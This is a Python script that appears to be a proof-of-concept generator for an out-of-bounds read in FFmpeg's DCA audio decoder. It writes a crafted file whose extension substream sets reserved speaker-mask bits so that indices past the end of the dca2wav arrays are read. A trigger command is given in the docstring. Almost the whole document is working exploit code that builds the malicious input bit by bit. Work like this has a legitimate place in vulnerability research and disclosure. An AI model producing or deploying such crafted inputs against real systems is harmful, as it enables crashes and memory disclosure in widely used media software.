#!/usr/bin/env python3
"""
PoC Generator for VULN 002: OOB Read on dca2wav[] in ff_dca_set_channel_layout.

The dca2wav_norm and dca2wav_wide arrays are each 28 elements. In the
CHANNEL_ORDER_CODED path, ff_dca_set_channel_layout iterates dca_ch up to
DCA_SPEAKER_COUNT (32) and accesses dca2wav[dca_ch] for any set bit. If the
dca_mask has bits 28-31 set (DCA_SPEAKER_RSV1..RSV4), indices 28-31 are read
OOB.

Strategy:
  - Core frame: MONO (audio_mode=0), no CSS extension, no LFE, 1 subframe.
    All subband bit_allocations = 0 so no actual audio bits are needed.
  - EXSS (Extension SubStream) with XXCH component:
    - xxch_mask_nbits = 32 (field=31)
    - xxch_spkr_mask has bits 28 and 29 set (DCA_SPEAKER_RSV1, RSV2)
      => 2 XXCH channels (popcount=2 = DCA_XXCH_CHANNELS_MAX)
    - xxch_core_mask = 0x01 (matches MONO core ch_mask)
    - XXCH channel set also has 0-bit allocations → no audio data needed
    - DSYNC 0xffff markers placed where required
  - All CRC checks are gated by avctx->err_recognition which is 0 by default
    in ffmpeg → skipped automatically.

Trigger:  ffmpeg -channel_order coded -i vuln_002_input.dca -f null -
"""

import os, struct

# ---------------------------------------------------------------------------
# Minimal bit-packer (MSB-first, matching FFmpeg's GetBitContext)
# ---------------------------------------------------------------------------

class BitBuilder:
    def __init__(self, size):
        self.buf = bytearray(size)
        self.pos = 0            # current bit position

    def write_bits(self, value, nbits):
        """Write nbits bits of value MSB-first."""
        for i in range(nbits - 1, -1, -1):
            bit = (value >> i) & 1
            byte_idx = self.pos >> 3
            bit_mask = 1 << (7 - (self.pos & 7))
            if bit:
                self.buf[byte_idx] |= bit_mask
            else:
                self.buf[byte_idx] &= ~bit_mask
            self.pos += 1

    def seek_to_bit(self, bit_pos):
        """Jump to an absolute bit position (must be forward or equal)."""
        if bit_pos < self.pos:
            raise ValueError(f"Cannot seek backward {bit_pos} < {self.pos}")
        self.pos = bit_pos

    def cur(self):
        return self.pos

    def get_bytes(self):
        return bytes(self.buf)


# ---------------------------------------------------------------------------
# Build core frame (512 bytes)
# ---------------------------------------------------------------------------

CORE_FRAME_SIZE = 512

def build_core_frame():
    b = BitBuilder(CORE_FRAME_SIZE)

    # ---- DCA core frame header (ff_dca_parse_core_frame_header) ----
    b.write_bits(0x7FFE8001, 32)  # DCA_SYNCWORD_CORE_BE

    b.write_bits(1,    1)   # normal_frame = 1
    b.write_bits(31,   5)   # deficit_samples = 31 → 32 = DCA_PCMBLOCK_SAMPLES
    b.write_bits(0,    1)   # crc_present = 0
    b.write_bits(7,    7)   # npcmblocks = 7 → 8  (8 % DCA_SUBBAND_SAMPLES == 0)
    b.write_bits(CORE_FRAME_SIZE - 1, 14)  # frame_size field → 512 bytes
    b.write_bits(0,    6)   # audio_mode = 0  (DCA_AMODE_MONO, 1 channel)
    b.write_bits(13,   4)   # sr_code = 13  → 48000 Hz
    b.write_bits(0,    5)   # br_code = 0
    b.write_bits(0,    1)   # reserved bit = 0  (must be 0)
    b.write_bits(0,    1)   # drc_present = 0
    b.write_bits(0,    1)   # ts_present  = 0
    b.write_bits(0,    1)   # aux_present = 0
    b.write_bits(0,    1)   # hdcd_master = 0
    b.write_bits(0,    3)   # ext_audio_type = 0  (no CSS extension used)
    b.write_bits(0,    1)   # ext_audio_present = 0  → skip extension search
    b.write_bits(0,    1)   # sync_ssf = 0
    b.write_bits(0,    2)   # lfe_present = 0  (DCA_LFE_FLAG_INVALID is 3 — 0 is safe)
    b.write_bits(0,    1)   # predictor_history = 0
    # no CRC (crc_present == 0)
    b.write_bits(0,    1)   # filter_perfect = 0
    b.write_bits(0,    4)   # encoder_rev = 0
    b.write_bits(0,    2)   # copy_hist = 0
    b.write_bits(0,    3)   # pcmr_code = 0  → 16 bits/sample (non-zero, valid)
    b.write_bits(0,    1)   # sumdiff_front = 0
    b.write_bits(0,    1)   # sumdiff_surround = 0
    b.write_bits(0,    4)   # dn_code = 0
    # bit position after frame header = 104

    # ---- Coding header (parse_coding_header, HEADER_CORE, xch_base=0) ----
    b.write_bits(0,    4)   # nsubframes = 0 → 1
    b.write_bits(0,    3)   # nchannels  = 0 → 1  (== ff_dca_channels[0] = 1)

    # channel 0 (MONO)
    b.write_bits(0,    5)   # nsubbands[0] = 0 → 2
    b.write_bits(1,    5)   # subband_vq_start[0] = 1 → 2  (== nsubbands: no VQ bands)
    b.write_bits(0,    3)   # joint_intensity_index[0] = 0
    b.write_bits(0,    2)   # transition_mode_sel[0] = 0
    b.write_bits(0,    3)   # scale_factor_sel[0] = 0  (valid: 0-6)
    b.write_bits(5,    3)   # bit_allocation_sel[0] = 5  (→ 4-bit non-VLC per band)
    # quant_index_sel[0][n] for n=0..9; set all to max so scale_factor_adj is NOT read
    # group sizes: {1,3,3,3,3,7,7,7,7,7}; nbits: {1,2,2,2,2,3,3,3,3,3}
    b.write_bits(1, 1)   # book 0: max=1 >= group_size=1 → no adj
    b.write_bits(3, 2)   # book 1: max=3 >= 3
    b.write_bits(3, 2)   # book 2
    b.write_bits(3, 2)   # book 3
    b.write_bits(3, 2)   # book 4
    b.write_bits(7, 3)   # book 5: max=7 >= 7
    b.write_bits(7, 3)   # book 6
    b.write_bits(7, 3)   # book 7
    b.write_bits(7, 3)   # book 8
    b.write_bits(7, 3)   # book 9
    # bit position after coding header = 156

    # ---- Subframe header (sf=0, HEADER_CORE, xch_base=0) ----
    b.write_bits(0,    2)   # nsubsubframes[0] = 0 → 1
    b.write_bits(0,    3)   # partial subsubframe count (skipped by decoder)
    # prediction_mode[0][band 0..1] = 0  (no prediction → no VQ index needed)
    b.write_bits(0,    1)   # band 0
    b.write_bits(0,    1)   # band 1
    # bit_allocation[0][band 0..1]; sel=5 → get_bits(4) per band
    b.write_bits(0,    4)   # band 0 = 0 → no audio bits
    b.write_bits(0,    4)   # band 1 = 0
    # (no transitions, no scale factors, no joint subband coding)
    # bit position after subframe header = 171

    # ---- Subframe audio (sf=0, HEADER_CORE) ----
    # VQ subbands: subband_vq_start = nsubbands = 2  → empty
    # LFE: lfe_present = 0 → skip
    # Audio data: all abits=0 → extract_audio() memsets to 0, no bits read
    # DSYNC check: ssf=0 == nsubsubframes[0]-1=0  → must be 0xffff
    b.write_bits(0xffff, 16)
    # bit position = 187

    return b.get_bytes()


# ---------------------------------------------------------------------------
# Build XXCH data (100 bytes) that goes inside the EXSS asset
# ---------------------------------------------------------------------------

XXCH_SIZE = 100

def build_xxch_data():
    b = BitBuilder(XXCH_SIZE)

    # == XXCH frame header (parsed by parse_xxch_frame) ==
    # header_pos = 0

    b.write_bits(0x47004A03, 32)   # DCA_SYNCWORD_XXCH
    b.write_bits(11,  6)            # header_size field = 11 → header_size = 12 bytes
    # CRC check: ff_dca_check_crc gated by err_recognition → always skipped at default
    b.write_bits(0,   1)            # xxch_crc_present = 0
    b.write_bits(31,  5)            # xxch_mask_nbits field = 31 → 32
    b.write_bits(0,   2)            # xxch_nchsets field = 0 → 1 channel set
    b.write_bits(39, 14)            # xxch_frame_size field = 39 → 40 bytes
    # xxch_core_mask must equal s->ch_mask for MONO core = DCA_SPEAKER_LAYOUT_MONO = 0x01
    b.write_bits(0x00000001, 32)    # xxch_core_mask = 0x01
    # bits used: 32+6+1+5+2+14+32 = 92; seek to header_size*8 = 96
    b.seek_to_bit(96)

    # == XXCH channel set header (parsed by parse_coding_header HEADER_XXCH) ==
    # header_pos2 = 96

    b.write_bits(19,  7)            # channel-set header_size field = 19 → 20 bytes
    # CRC skipped (xxch_crc_present=0)

    # nchannels field = 1 → nchannels = 2  (== DCA_XXCH_CHANNELS_MAX=2, OK)
    # s->nchannels becomes ff_dca_channels[0]+2 = 1+2 = 3 (≤ DCA_CHANNELS=7)
    b.write_bits(1,   3)

    # xxch_spkr_mask:
    #   read get_bits_long(xxch_mask_nbits - DCA_SPEAKER_Cs) = get_bits_long(32-6) = 26
    #   xxch_spkr_mask = raw_mask << 6
    #   We want bits 28 and 29 set in xxch_spkr_mask → bits 22 and 23 in raw_mask
    #   raw_mask = (1<<22)|(1<<23) = 0xC00000
    b.write_bits(0xC00000, 26)

    # downmix_present = 0 → xxch_dmix_embedded = 0
    b.write_bits(0,   1)

    # -- common coding header fields for ch=1, ch=2 (xch_base=1) --
    # nsubbands[1], nsubbands[2]: get_bits(5)+2; field=0 → 2 subbands each
    b.write_bits(0,   5)   # nsubbands[1]
    b.write_bits(0,   5)   # nsubbands[2]
    # subband_vq_start[1], [2]: get_bits(5)+1; field=1 → 2 (== nsubbands → no VQ)
    b.write_bits(1,   5)   # subband_vq_start[1]
    b.write_bits(1,   5)   # subband_vq_start[2]
    # joint_intensity_index[1], [2] (HEADER_XXCH path: n += xch_base-1 if n>0)
    b.write_bits(0,   3)   # [1] = 0
    b.write_bits(0,   3)   # [2] = 0
    # transition_mode_sel[1], [2]
    b.write_bits(0,   2)
    b.write_bits(0,   2)
    # scale_factor_sel[1], [2]  (must be < 7)
    b.write_bits(0,   3)
    b.write_bits(0,   3)
    # bit_allocation_sel[1], [2] = 5 → reads 4-bit non-VLC values per band
    b.write_bits(5,   3)
    b.write_bits(5,   3)
    # quant_index_sel for ch=1 (all max → no scale_factor_adj read)
    b.write_bits(1, 1); b.write_bits(3, 2); b.write_bits(3, 2)
    b.write_bits(3, 2); b.write_bits(3, 2)
    b.write_bits(7, 3); b.write_bits(7, 3); b.write_bits(7, 3)
    b.write_bits(7, 3); b.write_bits(7, 3)
    # quant_index_sel for ch=2
    b.write_bits(1, 1); b.write_bits(3, 2); b.write_bits(3, 2)
    b.write_bits(3, 2); b.write_bits(3, 2)
    b.write_bits(7, 3); b.write_bits(7, 3); b.write_bits(7, 3)
    b.write_bits(7, 3); b.write_bits(7, 3)
    # bits consumed from header_pos2=96: 7+3+26+1+5+5+5+5+3+3+2+2+3+3+3+3+24+24 = 127
    # → current bit = 96+127 = 223
    # Seek to header_pos2 + header_size2*8 = 96+160 = 256
    b.seek_to_bit(256)

    # == Subframe header (sf=0, HEADER_XXCH, xch_base=1) ==
    # prediction_mode for ch=1 bands 0..1, ch=2 bands 0..1
    b.write_bits(0, 1); b.write_bits(0, 1)   # ch=1
    b.write_bits(0, 1); b.write_bits(0, 1)   # ch=2
    # bit_allocation[1][0..1] sel=5 → 4 bits each
    b.write_bits(0, 4); b.write_bits(0, 4)
    # bit_allocation[2][0..1]
    b.write_bits(0, 4); b.write_bits(0, 4)
    # → at bit 276

    # == Subframe audio (sf=0, HEADER_XXCH, xch_base=1) ==
    # VQ subbands: empty. LFE: not HEADER_CORE → skip.
    # abits=0 for all bands → no audio bits read.
    # DSYNC: ssf=0 == nsubsubframes[0]-1=0 → must be 0xffff
    b.write_bits(0xffff, 16)
    # → at bit 292

    # parse_xxch_frame final seek:
    # header_pos(0) + header_size(12)*8 + xxch_frame_size(40)*8 = 96+320 = 416
    # current=292 < 416; buffer=800 ≥ 416  ✓  → ff_dca_seek_bits succeeds

    return b.get_bytes()


# ---------------------------------------------------------------------------
# Build EXSS (Extension SubStream), 130 bytes
# ---------------------------------------------------------------------------

EXSS_HEADER_SIZE = 30   # bytes (includes the 4-byte sync word)
EXSS_ASSET_SIZE  = XXCH_SIZE  # 100 bytes
EXSS_TOTAL_SIZE  = EXSS_HEADER_SIZE + EXSS_ASSET_SIZE  # 130 bytes

def build_exss(xxch_bytes):
    assert len(xxch_bytes) == XXCH_SIZE

    b = BitBuilder(EXSS_TOTAL_SIZE)

    # -- ff_dca_exss_parse --

    # Sync word (skip_bits_long 32 in ff_dca_exss_parse, then we use AV_RB32 in dcadec)
    b.write_bits(0x64582025, 32)   # DCA_SYNCWORD_SUBSTREAM

    b.write_bits(0,  8)            # user defined bits
    b.write_bits(0,  2)            # exss_index = 0
    b.write_bits(0,  1)            # wide_hdr = 0  (8-bit header_size field)
    b.write_bits(EXSS_HEADER_SIZE - 1, 8)  # header_size field = 29 → 30 bytes
    # CRC check: ff_dca_check_crc(avctx, ...) skipped at default err_recognition=0
    b.write_bits(EXSS_TOTAL_SIZE - 1, 16)  # exss_size field = 129 → 130 bytes
    b.write_bits(0,  1)            # static_fields_present = 0
    #   → npresents = 1, nassets = 1  (set by code at lines 473-474)

    # Asset data sizes (16-bit, exss_size_nbits=16)
    b.write_bits(EXSS_ASSET_SIZE - 1, 16)  # asset_size[0] = 99 → 100 bytes
    # asset_offset = header_size = 30; 30+100=130 = exss_size  ✓

    # -- parse_descriptor for asset 0 --
    DESCR_SIZE = 8   # bytes
    descr_pos_bits = b.cur()  # = 84 bits
    b.write_bits(DESCR_SIZE - 1, 9)   # descr_size field = 7 → 8 bytes
    b.write_bits(0, 3)                 # asset_index = 0

    # static_fields_present = 0 → skip per-stream static metadata block

    b.write_bits(0, 1)   # drc_present = 0
    b.write_bits(0, 1)   # dialog_norm = 0
    # mix_metadata_enabled = 0 → no mixing metadata
    b.write_bits(0, 2)   # coding_mode = 0  (multi-component)
    # extension_mask: DCA_EXSS_XXCH = 0x040  (12-bit field)
    b.write_bits(0x040, 12)
    # DCA_EXSS_XXCH present → read xxch_size (14-bit field)
    b.write_bits(XXCH_SIZE - 1, 14)   # xxch_size field = 99 → 100 bytes

    # Seek to end of descriptor (descr_pos + descr_size*8 = 84+64 = 148)
    b.seek_to_bit(descr_pos_bits + DESCR_SIZE * 8)

    # Seek to end of EXSS header (header_size*8 = 240 bits)
    b.seek_to_bit(EXSS_HEADER_SIZE * 8)

    # Copy XXCH asset data into bytes [EXSS_HEADER_SIZE .. EXSS_TOTAL_SIZE-1]
    for i, byte_val in enumerate(xxch_bytes):
        b.buf[EXSS_HEADER_SIZE + i] = byte_val

    return b.get_bytes()


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    script_dir = os.path.dirname(os.path.abspath(__file__))
    output_path = os.path.join(script_dir, 'vuln_002_input.dca')

    core  = build_core_frame()
    xxch  = build_xxch_data()
    exss  = build_exss(xxch)
    data  = core + exss

    with open(output_path, 'wb') as f:
        f.write(data)

    print(f"[+] Written {len(data)} bytes to {output_path}")
    print(f"    Core frame : {len(core)} bytes")
    print(f"    EXSS       : {len(exss)} bytes  (header={EXSS_HEADER_SIZE}, "
          f"XXCH asset={XXCH_SIZE})")

if __name__ == '__main__':
    main()
